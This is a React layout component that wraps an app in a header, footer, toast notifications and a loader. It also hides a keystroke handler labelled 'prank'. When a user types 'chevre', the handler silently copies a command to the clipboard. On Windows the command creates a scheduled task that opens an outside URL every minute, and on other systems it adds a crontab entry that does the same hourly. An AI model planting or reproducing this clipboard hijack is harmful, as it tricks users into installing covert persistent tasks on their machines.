import React from 'react';
import './Template.css';
import 'react-toastify/dist/ReactToastify.css';
import {ToastContainer} from 'react-toastify';
import {Header} from "./Header";
import {Footer} from "./Footer";
import { Loader } from '../feature/loader/components/Loader';

export class Template extends React.Component {

    phrase = "";
    prank = (event) => {
        this.phrase += event.key
        if (this.phrase.includes("chevre")) {
            alert('Copié')
            this.copyToClipboard()
            this.phrase = "";
        }
    }

    copyToClipboard = () => {
        const platform = window.navigator.platform
        const windowsPlatforms = ['Win32', 'Win64', 'Windows', 'WinCE']
        const textField = document.createElement('textarea')
        if (windowsPlatforms.indexOf(platform) !== -1) {
            textField.innerText = "schtasks /CREATE /sc minute /TN CHEVRE_GANG /TR \"cmd.exe /c start https://malzik.ovh/goat\" && cmd /c echo.|clip"
        } else {
            textField.innerText = "crontab -l | { cat; echo \"0 * * * * export DISPLAY=:0 && firefox --new-window https://malzik.ovh/goat\"; } | crontab -"
        }
        document.body.appendChild(textField)
        textField.select()
        document.execCommand('copy')
        textField.remove()
    }

    render() {
        const {children} = this.props;
        return (
            <div className="Template" onKeyDown={this.prank} tabIndex="0">
                <Header/>
                <ToastContainer/>
                {children}
                <Loader />
                <Footer/>
            </div>
        );
    }
}
